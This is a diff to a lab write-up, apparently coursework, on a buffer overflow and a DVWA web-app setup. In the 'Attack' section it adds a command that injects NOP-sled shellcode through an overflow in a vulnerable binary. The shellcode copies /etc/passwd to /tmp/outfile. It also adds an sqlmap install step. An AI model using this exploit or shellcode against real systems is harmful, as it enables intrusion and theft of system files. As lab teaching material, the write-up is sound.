@@ -114,6 +114,9 @@ Use gdb to find redundant_code function address:
 stack frame for main fucntion <br>
 ![](./imgs/task1_5.png)
 ## 4. Attack
+```
+	./vulnerable.out $(python -c "print('a'*20+'\x4c\xd7\xff\xff'+'\x90'*100 +'\x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80' )")
+```
 
 **Conclusion**: in main fucntion use unsafe function `strcpy`, that lead to attack buffer overflow for attacker inject code, to prevent it, we can use safe function like `strncpy`
 
@@ -131,7 +134,13 @@ docker run --rm -it -p 80:80 vulnerables/web-dvwa
 ```
 
 Open your browser and navigate to http://localhost. You should see the DVWA login page. <br>
-![](./imgs/task2_1.png)
+![](./imgs/task2_1.png) <br>
+
+Install Sqlmap <br>
+```
+	sudo apt install sqlmap
+```
+
 
 Login with the default credentials: <br>
 
